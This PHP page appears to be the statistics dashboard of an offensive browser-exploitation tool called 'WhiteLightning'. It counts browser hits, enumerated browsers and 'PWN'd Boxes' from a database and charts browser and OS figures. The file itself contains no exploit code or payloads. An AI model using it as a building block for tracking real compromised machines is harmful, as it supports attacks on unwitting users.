<?php
	include('includes/validate.php');	

	$hits_count = "?";
	$q = "SELECT COUNT(hit_id) FROM hits";
	try {
		$r = @mysqli_query ($dbc, $q);
		$row = @mysqli_fetch_array ($r, MYSQLI_NUM);
		$hits_count = $row[0];
	} catch (Exception $e) {
		$hits_count = "?";
	}

	$throws_count = "?";
	$q = "SELECT COUNT(throw_id) FROM throws";
	try {
		$r = @mysqli_query ($dbc, $q);
		$row = @mysqli_fetch_array ($r, MYSQLI_NUM);
		$throws_count = $row[0];
	} catch (Exception $e) {
		$throws_count = "?";
	}
	
	$loads_count = "?";
	$q = "SELECT COUNT(load_id) FROM loads";
	try {
		$r = @mysqli_query ($dbc, $q);
		$row = @mysqli_fetch_array ($r, MYSQLI_NUM);
		$loads_count = $row[0];
	} catch (Exception $e) {
		$loads_count = "?";
	}
?>
<head>
	<title>WhiteLightning</title>

	<link rel="stylesheet" type="text/css" href="css/plugins/morris.css">
	
	<script type="text/javascript" language="javascript" src="js/jquery.js"></script>
	<script type="text/javascript" language="javascript" src="js/bootstrap.min.js"></script>
	<script type="text/javascript" language="javascript" src="js/plugins/morris/morris.min.js"></script>
	<script type="text/javascript" language="javascript" src="js/plugins/morris/morris-data.js"></script>
	<script type="text/javascript" language="javascript" src="js/plugins/morris/raphael.min.js"></script>
</head>
<body>
	<div id="wrapper">
		<?php include('outline.php'); ?>
		<div id="page-wrapper">
			<div class="container-fluid">
				<div class="row">
					<div class="col-lg-12">
						<h1 class="page-header">
						<small>Statistics Overview</small>
						</h1>
					</div>
				</div>
				<div class="row">
					<div class="col-lg-3 col-md-6">
						<div class="panel panel-green">
							<div class="panel-heading">
								<div class="row">
									<div class="col-xs-3">
										<i class="fa fa-tasks fa-5x"></i>
									</div>
									<div class="col-xs-9 text-right">
										<div class="huge"><?php echo $hits_count;?></div>
										<div>Browser Hits!</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="col-lg-3 col-md-6">
						<div class="panel panel-yellow">
							<div class="panel-heading">
								<div class="row">
									<div class="col-xs-3">
										<i class="fa fa-shopping-cart fa-5x"></i>
									</div>
									<div class="col-xs-9 text-right">
										<div class="huge"><?php echo $throws_count;?></div>
										<div>Browsers Enumerated!!</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="col-lg-3 col-md-6">
						<div class="panel panel-red">
							<div class="panel-heading">
								<div class="row">
									<div class="col-xs-3">
										<i class="fa fa-support fa-5x"></i>
									</div>
									<div class="col-xs-9 text-right">
										<div class="huge"><?php echo $loads_count;?></div>
										<div>PWN'd Boxes!!!</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="row">
					<div class="col-lg-5">
						<div class="panel panel-primary">
							<div class="panel-heading">
								<h3 class="panel-title"><i class="fa fa-long-arrow-right"></i> Browser Statistics</h3>
							</div>
							<div class="panel-body">
								<div id="morris-bar-chart"></div>
							</div>
						</div>
					</div>
					<div class="col-lg-4">
						<div class="panel panel-primary">
							<div class="panel-heading">
								<h3 class="panel-title"><i class="fa fa-long-arrow-right fa-fw"></i> OS Statistics</h3>
							</div>
							<div class="panel-body">
								<div id="morris-donut-chart"></div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</body>
</html>